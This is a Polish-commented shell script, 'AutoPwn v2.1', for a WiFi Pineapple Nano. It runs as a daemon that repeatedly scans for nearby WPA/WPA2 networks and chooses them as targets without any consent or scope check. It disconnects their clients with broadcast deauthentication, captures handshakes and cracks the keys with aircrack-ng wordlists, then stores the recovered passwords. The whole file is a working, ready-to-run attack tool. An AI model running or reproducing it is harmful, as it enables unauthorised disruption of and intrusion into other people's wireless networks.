#!/bin/sh
#############################################
# 🍍 AutoPwn v2.1 - Autonomous WiFi Hunter 🎮
# Pineapple Nano Edition - BusyBox Compatible
# 
# Jak Pwnagotchi ale dla Pineapple!
# Uczy się które techniki działają najlepiej
#############################################

VERSION="2.1"
BASEDIR="/sd/autopwn"
CAPTURES="$BASEDIR/captures"
LOGS="$BASEDIR/logs"
STATS="$BASEDIR/stats"
WORDLISTS="$BASEDIR/wordlists"
LEARNING="$BASEDIR/learning"
CRACKED_FILE="$STATS/cracked.txt"
TARGETS_FILE="$STATS/targets.txt"
LEARNING_DB="$LEARNING/techniques.db"

# Interfejs - wykryj automatycznie
INTERFACE=""

# Konfiguracja czasów (długie - urządzenie wolne!)
SCAN_TIME=45
DEAUTH_COUNT=3
CAPTURE_TIME=30
MIN_SIGNAL=-80
SLEEP_BETWEEN=10
MAX_CYCLES=1000

# BEZPIECZEŃSTWO - minimalne wolne miejsce (KB)
MIN_FREE_SPACE=50000

#############################################
# FUNKCJA TIMEOUT (BusyBox compatible)
#############################################

run_with_timeout() {
    # Użycie: run_with_timeout <sekundy> <komenda>
    local timeout_sec="$1"
    shift
    local cmd="$@"
    
    # Uruchom w tle
    $cmd &
    local cmd_pid=$!
    
    # Czekaj określony czas
    local count=0
    while [ $count -lt $timeout_sec ]; do
        if ! kill -0 $cmd_pid 2>/dev/null; then
            # Proces zakończył się sam
            wait $cmd_pid
            return $?
        fi
        sleep 1
        count=$((count + 1))
    done
    
    # Timeout - zabij proces
    kill $cmd_pid 2>/dev/null
    sleep 1
    kill -9 $cmd_pid 2>/dev/null
    return 124
}

#############################################
# FUNKCJE BEZPIECZEŃSTWA
#############################################

check_disk_space() {
    local free=$(df /sd 2>/dev/null | awk 'NR==2 {print $4}')
    if [ -z "$free" ] || [ "$free" -lt "$MIN_FREE_SPACE" ]; then
        log "⚠️ Mało miejsca na SD! ($free KB)"
        find "$LOGS" -name "*.log" -mtime +7 -delete 2>/dev/null
        find "$CAPTURES" -name "*.csv" -delete 2>/dev/null
        return 1
    fi
    return 0
}

check_flash_space() {
    local flash_free=$(df /overlay 2>/dev/null | awk 'NR==2 {print $4}')
    if [ -n "$flash_free" ] && [ "$flash_free" -lt 200 ]; then
        log "🚨 KRYTYCZNE: Flash prawie pełny!"
        cleanup_and_exit
    fi
}

safe_write() {
    local file="$1"
    local content="$2"
    case "$file" in
        /sd/*) echo "$content" >> "$file" ;;
        *) log "⚠️ Zapis poza SD zablokowany: $file" ;;
    esac
}

#############################################
# FUNKCJE POMOCNICZE
#############################################

log() {
    local msg="[$(date '+%H:%M:%S')] $1"
    echo "$msg"
    [ -d "$LOGS" ] && echo "$msg" >> "$LOGS/autopwn_$(date +%Y%m%d).log"
}

detect_interface() {
    for iface in wlan1mon wlan0mon mon0; do
        if iwinfo "$iface" info >/dev/null 2>&1; then
            INTERFACE="$iface"
            log "✅ Interfejs: $INTERFACE"
            return 0
        fi
    done
    
    for iface in wlan1 wlan0; do
        if iwinfo "$iface" info >/dev/null 2>&1; then
            log "📡 Tworzę monitor na $iface..."
            airmon-ng start "$iface" >/dev/null 2>&1
            sleep 5
            INTERFACE="${iface}mon"
            if iwinfo "$INTERFACE" info >/dev/null 2>&1; then
                log "✅ Monitor: $INTERFACE"
                return 0
            fi
        fi
    done
    
    log "❌ Brak interfejsu WiFi!"
    return 1
}

cleanup_temp() {
    rm -f /sd/autopwn/tmp/* 2>/dev/null
    rm -f /tmp/autopwn.pid 2>/dev/null
}

cleanup_and_exit() {
    log "🛑 Zatrzymuję AutoPwn..."
    killall airodump-ng aireplay-ng aircrack-ng 2>/dev/null
    cleanup_temp
    exit 0
}

trap cleanup_and_exit INT TERM

#############################################
# SYSTEM UCZENIA SIĘ 🧠
#############################################

init_learning() {
    mkdir -p "$LEARNING"
    [ ! -f "$LEARNING_DB" ] && cat > "$LEARNING_DB" << 'INITDB'
# Technika | Próby | Sukcesy | Waga
deauth_broadcast|0|0|50
deauth_targeted|0|0|50
passive|0|0|50
INITDB
}

record_attempt() {
    local technique="$1"
    local success="$2"
    
    [ ! -f "$LEARNING_DB" ] && init_learning
    
    local line=$(grep "^${technique}|" "$LEARNING_DB")
    if [ -n "$line" ]; then
        local attempts=$(echo "$line" | cut -d'|' -f2)
        local successes=$(echo "$line" | cut -d'|' -f3)
        
        attempts=$((attempts + 1))
        [ "$success" = "1" ] && successes=$((successes + 1))
        
        local weight=50
        [ "$attempts" -gt 0 ] && weight=$((successes * 100 / attempts))
        [ "$weight" -lt 10 ] && weight=10
        
        sed -i "s/^${technique}|.*/${technique}|${attempts}|${successes}|${weight}/" "$LEARNING_DB"
        log "🧠 $technique: $successes/$attempts ($weight%)"
    fi
}

get_best_technique() {
    [ ! -f "$LEARNING_DB" ] && init_learning
    grep -v "^#" "$LEARNING_DB" | sort -t'|' -k4 -nr | head -1 | cut -d'|' -f1
}

#############################################
# FUNKCJE ATAKU
#############################################

scan_networks() {
    log "📡 Skanowanie ($SCAN_TIME s)..."
    
    check_disk_space || return 1
    
    mkdir -p "/sd/autopwn/tmp"
    local scanfile="/sd/autopwn/tmp/scan-$$"
    
    # Uruchom airodump w tle
    airodump-ng "$INTERFACE" -w "$scanfile" --output-format csv --write-interval 3 >/dev/null 2>&1 &
    local aid_pid=$!
    
    # Poczekaj
    sleep $SCAN_TIME
    
    # Zabij airodump
    kill $aid_pid 2>/dev/null
    sleep 2
    kill -9 $aid_pid 2>/dev/null
    
    # Parsuj wyniki
    if [ -f "${scanfile}-01.csv" ]; then
        # Wyciągnij BSSID, kanał, sygnał, ESSID dla sieci WPA/WPA2
        grep -E "WPA|WPA2" "${scanfile}-01.csv" 2>/dev/null | \
        awk -F',' '{
            bssid=$1; 
            channel=$4; 
            signal=$9; 
            essid=$14;
            gsub(/^ +| +$/, "", bssid);
            gsub(/^ +| +$/, "", channel);
            gsub(/^ +| +$/, "", signal);
            gsub(/^ +| +$/, "", essid);
            if (signal > -85 && length(essid) > 0) {
                print bssid","channel","signal","essid
            }
        }' | head -10 > "$TARGETS_FILE"
        
        local count=$(wc -l < "$TARGETS_FILE" 2>/dev/null)
        count=${count:-0}
        log "📊 Znaleziono $count sieci"
        
        rm -f ${scanfile}* 2>/dev/null
        [ "$count" -gt 0 ] && return 0
    fi
    
    rm -f ${scanfile}* 2>/dev/null
    return 1
}

try_deauth_broadcast() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"
    
    log "💥 Deauth na $essid (ch:$channel)..."
    
    check_disk_space || return 1
    
    # Ustaw kanał
    iwconfig "$INTERFACE" channel "$channel" 2>/dev/null
    sleep 2
    
    local capfile="/sd/autopwn/tmp/cap_$$"
    
    # Uruchom capture
    airodump-ng "$INTERFACE" -c "$channel" --bssid "$bssid" \
        -w "$capfile" --output-format pcap >/dev/null 2>&1 &
    local cap_pid=$!
    
    sleep 5
    
    # Wyślij deauth (kilka razy)
    local i=0
    while [ $i -lt 3 ]; do
        aireplay-ng -0 $DEAUTH_COUNT -a "$bssid" "$INTERFACE" >/dev/null 2>&1
        sleep 3
        i=$((i + 1))
    done
    
    # Czekaj na handshake
    sleep 15
    
    # Zatrzymaj capture
    kill $cap_pid 2>/dev/null
    sleep 2
    kill -9 $cap_pid 2>/dev/null
    
    # Sprawdź handshake
    if [ -f "${capfile}-01.cap" ]; then
        local check=$(aircrack-ng "${capfile}-01.cap" 2>&1)
        if echo "$check" | grep -q "1 handshake"; then
            log "🎉 HANDSHAKE: $essid"
            mv "${capfile}-01.cap" "$CAPTURES/${essid}_$(date +%Y%m%d_%H%M%S).cap"
            record_attempt "deauth_broadcast" 1
            rm -f ${capfile}* 2>/dev/null
            return 0
        fi
    fi
    
    rm -f ${capfile}* 2>/dev/null
    record_attempt "deauth_broadcast" 0
    return 1
}

try_crack() {
    local capfile="$1"
    local essid="$2"
    
    log "🔓 Łamię $essid..."
    
    for wl in "$WORDLISTS/common.txt" "$WORDLISTS/polish.txt"; do
        [ ! -f "$wl" ] && continue
        
        # Uruchom aircrack w tle z timeoutem
        aircrack-ng -w "$wl" -q "$capfile" > /tmp/crack_result.txt 2>&1 &
        local crack_pid=$!
        
        # Czekaj max 120 sekund
        local wait=0
        while [ $wait -lt 120 ]; do
            if ! kill -0 $crack_pid 2>/dev/null; then
                break
            fi
            sleep 5
            wait=$((wait + 5))
        done
        kill $crack_pid 2>/dev/null
        
        if grep -q "KEY FOUND" /tmp/crack_result.txt 2>/dev/null; then
            local key=$(grep "KEY FOUND" /tmp/crack_result.txt | sed 's/.*\[ \(.*\) \].*/\1/')
            log "🔑🔑🔑 ZŁAMANE! $essid : $key"
            safe_write "$CRACKED_FILE" "$(date '+%Y-%m-%d %H:%M') | $essid | $key"
            rm -f /tmp/crack_result.txt
            return 0
        fi
        rm -f /tmp/crack_result.txt
    done
    
    log "❌ Nie złamano $essid"
    return 1
}

#############################################
# GŁÓWNA PĘTLA
#############################################

main_loop() {
    log "========================================="
    log "🍍 AutoPwn v$VERSION - START"
    log "========================================="
    
    detect_interface || { log "❌ Brak interfejsu!"; exit 1; }
    init_learning
    mkdir -p "$CAPTURES" "$LOGS" "$STATS" "$WORDLISTS" "$LEARNING" "/sd/autopwn/tmp"
    
    local cycle=0
    
    while [ $cycle -lt $MAX_CYCLES ]; do
        cycle=$((cycle + 1))
        log "--- Cykl #$cycle ---"
        
        check_flash_space
        check_disk_space || {
            log "⚠️ Czyszczę..."
            find "$CAPTURES" -name "*.csv" -delete 2>/dev/null
            find "$LOGS" -name "*.log" -mtime +3 -delete 2>/dev/null
            sleep 60
            continue
        }
        
        if scan_networks; then
            while IFS=',' read -r bssid channel signal essid; do
                [ -z "$bssid" ] && continue
                [ -z "$essid" ] && continue
                
                # Pomiń złamane
                grep -q "$essid" "$CRACKED_FILE" 2>/dev/null && continue
                
                log "🎯 Cel: $essid ($bssid) ch:$channel"
                
                if try_deauth_broadcast "$bssid" "$channel" "$essid"; then
                    local newest=$(ls -t "$CAPTURES"/*.cap 2>/dev/null | head -1)
                    [ -n "$newest" ] && try_crack "$newest" "$essid"
                fi
                
                sleep $SLEEP_BETWEEN
            done < "$TARGETS_FILE"
        else
            log "❌ Brak sieci WPA/WPA2"
        fi
        
        local hs_count=$(ls "$CAPTURES"/*.cap 2>/dev/null | wc -l)
        local cracked_count=$(wc -l < "$CRACKED_FILE" 2>/dev/null || echo 0)
        log "📊 Handshake: $hs_count | Złamane: $cracked_count"
        
        log "💤 Przerwa 60s..."
        sleep 60
    done
}

#############################################
# CLI
#############################################

show_status() {
    echo "🍍 AutoPwn v$VERSION"
    echo "================================"
    
    if [ -f /tmp/autopwn.pid ] && kill -0 $(cat /tmp/autopwn.pid) 2>/dev/null; then
        echo "✅ DZIAŁA (PID: $(cat /tmp/autopwn.pid))"
    else
        echo "❌ Nie działa"
    fi
    
    echo ""
    echo "📁 Handshake: $(ls $CAPTURES/*.cap 2>/dev/null | wc -l)"
    echo "🔑 Złamane: $(wc -l < $CRACKED_FILE 2>/dev/null || echo 0)"
    echo ""
    echo "🧠 Uczenie:"
    [ -f "$LEARNING_DB" ] && grep -v "^#" "$LEARNING_DB"
    echo ""
    echo "💾 SD: $(df /sd 2>/dev/null | awk 'NR==2 {printf "%.1f GB wolne", $4/1024/1024}')"
}

case "$1" in
    start)
        if [ -f /tmp/autopwn.pid ] && kill -0 $(cat /tmp/autopwn.pid) 2>/dev/null; then
            echo "⚠️ Już działa!"
            exit 1
        fi
        log "🚀 Uruchamiam..."
        $0 daemon &
        echo $! > /tmp/autopwn.pid
        echo "✅ PID: $!"
        ;;
    stop)
        [ -f /tmp/autopwn.pid ] && kill $(cat /tmp/autopwn.pid) 2>/dev/null
        killall airodump-ng aireplay-ng aircrack-ng 2>/dev/null
        cleanup_temp
        echo "🛑 Zatrzymano"
        ;;
    status)
        show_status
        ;;
    cracked)
        echo "🔑 Złamane:"
        [ -f "$CRACKED_FILE" ] && cat "$CRACKED_FILE" || echo "Brak"
        ;;
    daemon)
        main_loop
        ;;
    *)
        echo "🍍 AutoPwn v$VERSION"
        echo ""
        echo "Użycie: $0 {start|stop|status|cracked}"
        ;;
esac
